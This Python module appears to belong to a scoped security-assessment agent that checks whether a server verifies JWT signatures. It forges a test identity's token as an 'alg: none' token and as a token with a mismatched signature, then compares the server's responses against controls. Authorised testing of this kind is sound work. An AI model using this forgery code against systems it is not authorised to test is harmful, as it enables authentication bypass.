"""Bounded JWT signature-enforcement proof for one registered test identity.

The identity's own token is the only token ever modified. The probe adds a
nonce claim to its payload and re-encodes it two ways:

* ``alg_none``: header ``{"alg":"none"}`` and an empty signature;
* ``bad_signature``: the original header with the original signature, which no
  longer matches the changed payload.

Confirmed only when, on the same observed endpoint:

* the valid token is accepted (2xx);
* no token and a malformed token are both rejected (401/403), so auth runs
  before anything else (layer ordering);
* a forged token is accepted (2xx) with the same stable body as the valid
  token, while the rejected controls differ from it (body-diff).

Nothing escalates privileges or changes the subject; the claim is only that the
server does not verify token integrity. The model supplies no token bytes.
"""

from __future__ import annotations

import base64
import hashlib
import json
import re
from urllib.error import HTTPError
from urllib.request import Request, build_opener

from app.services.agent.assessment_proxy import assessment_urllib_handlers

from .browser import assert_in_scope
from .http_observe import _NoRedirect, _cookie_header

MAX_BODY = 256 * 1024
JWT_RE = re.compile(r"^[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]*$")
RECIPES = ("alg_none", "bad_signature")
_VOLATILE = re.compile(rb"[A-Za-z0-9+/=_-]{16,}")
_DIGITS = re.compile(rb"\d+")


def _b64decode(part: str) -> bytes:
    return base64.urlsafe_b64decode(part + "=" * (-len(part) % 4))


def _b64encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _stable_digest(body: bytes) -> str:
    return hashlib.sha256(_DIGITS.sub(b"0", _VOLATILE.sub(b"", body))).hexdigest()[:16]


def locate_token(session: dict) -> tuple[str, str, str]:
    """Return ``(where, name, token)`` for the identity's JWT, or raise."""
    for key, value in (session.get("headers") or {}).items():
        text = str(value or "")
        if str(key).lower() == "authorization" and text.lower().startswith("bearer "):
            token = text.split(None, 1)[1].strip()
            if JWT_RE.match(token):
                return "header", str(key), token
    for cookie in session.get("cookies") or []:
        value = str(cookie.get("value") or "")
        if JWT_RE.match(value):
            return "cookie", str(cookie.get("name") or ""), value
    raise ValueError("The test identity has no JWT bearer header or cookie")


def forge(token: str, recipe: str, nonce: str) -> str:
    try:
        header_b64, payload_b64, signature = token.split(".")
        header = json.loads(_b64decode(header_b64))
        payload = json.loads(_b64decode(payload_b64))
    except (ValueError, TypeError) as exc:
        raise ValueError("The identity token is not a decodable JWT") from exc
    if not isinstance(header, dict) or not isinstance(payload, dict):
        raise ValueError("The identity token is not a JSON object JWT")
    payload = {**payload, "prowl_nonce": nonce}
    body = _b64encode(json.dumps(payload, separators=(",", ":")).encode())
    if recipe == "alg_none":
        return f"{_b64encode(json.dumps({'alg': 'none', 'typ': 'JWT'}).encode())}.{body}."
    if recipe == "bad_signature":
        return f"{header_b64}.{body}.{signature}"
    raise ValueError("Unsupported JWT recipe")


def _request(url: str, *, allowed_origin: str, session: dict, where: str, name: str,
             token: str | None) -> tuple[int, bytes]:
    assert_in_scope(url, [allowed_origin])
    headers = {"Accept": "application/json, text/html;q=0.9, */*;q=0.8"}
    for key, value in (session.get("headers") or {}).items():
        if str(key).lower() not in {"authorization", "cookie", "host"}:
            headers[str(key)] = str(value)
    cookies = []
    state = {"cookies": [c for c in session.get("cookies") or []
                         if not (where == "cookie" and c.get("name") == name)]}
    base = _cookie_header(state, url)
    if base:
        cookies.append(base)
    if token is not None:
        if where == "header":
            headers[name] = f"Bearer {token}"
        else:
            cookies.append(f"{name}={token}")
    if cookies:
        headers["Cookie"] = "; ".join(cookies)
    opener = build_opener(*assessment_urllib_handlers(), _NoRedirect())
    try:
        response = opener.open(Request(url, headers=headers, method="GET"), timeout=20)
    except HTTPError as error:
        response = error
    with response:
        return int(response.status or 0), response.read(MAX_BODY)


def probe_jwt(url: str, *, allowed_origin: str, session: dict, nonce: str,
              recipes: tuple[str, ...] = RECIPES, send=_request) -> dict:
    if not nonce or len(nonce) < 8 or len(nonce) > 40 or not nonce.isalnum():
        raise ValueError("A random alphanumeric nonce of at least 8 characters is required")
    where, name, token = locate_token(session)

    def observe(value):
        status, body = send(url, allowed_origin=allowed_origin, session=session,
                            where=where, name=name, token=value)
        return {"status": status, "sha256": _stable_digest(body), "length": len(body)}

    valid = observe(token)
    unauthenticated = observe(None)
    malformed = observe("prowl." + nonce + ".invalid")
    requests_sent = 3
    gated = (200 <= valid["status"] < 300 and unauthenticated["status"] in {401, 403}
             and malformed["status"] in {401, 403})
    probes, hit = [], ""
    if gated:
        for recipe in recipes:
            row = {"recipe": recipe, **observe(forge(token, recipe, nonce))}
            requests_sent += 1
            row["signal"] = bool(200 <= row["status"] < 300 and row["sha256"] == valid["sha256"])
            probes.append(row)
            if row["signal"]:
                hit = recipe
                break
    confirmed = bool(hit and valid["sha256"] != unauthenticated["sha256"])
    return {
        "operation": "scoped_jwt_probe", "test_type": "jwt", "credential_location": where,
        "requests_sent": requests_sent, "valid": valid,
        "control": {"signal": False, "unauthenticated": unauthenticated, "malformed": malformed,
                    "sha256": unauthenticated["sha256"]},
        "auth_enforced": gated, "probes": probes, "recipe": hit,
        "proof_confirmed": confirmed, "finding": False,
    }


def jwt_proof_valid(row: dict) -> bool:
    if not isinstance(row, dict) or row.get("operation") != "scoped_jwt_probe":
        return False
    control = row.get("control") or {}
    valid = row.get("valid") or {}
    hit = next((p for p in row.get("probes") or []
                if isinstance(p, dict) and p.get("recipe") == row.get("recipe")), None)
    return bool(
        row.get("proof_confirmed") is True and row.get("auth_enforced") is True
        and row.get("recipe") in RECIPES and hit and hit.get("signal") is True
        and 200 <= int(valid.get("status") or 0) < 300
        and (control.get("unauthenticated") or {}).get("status") in {401, 403}
        and (control.get("malformed") or {}).get("status") in {401, 403}
        and hit.get("sha256") == valid.get("sha256") != control.get("sha256")
        and len(str(row.get("nonce") or "")) >= 8
    )


def jwt_pair_valid(first: dict, second: dict) -> bool:
    """Hunter and verifier receipts agree on recipe and token location."""
    return bool(
        jwt_proof_valid(first) and jwt_proof_valid(second)
        and first.get("recipe") == second.get("recipe")
        and first.get("credential_location") == second.get("credential_location")
    )
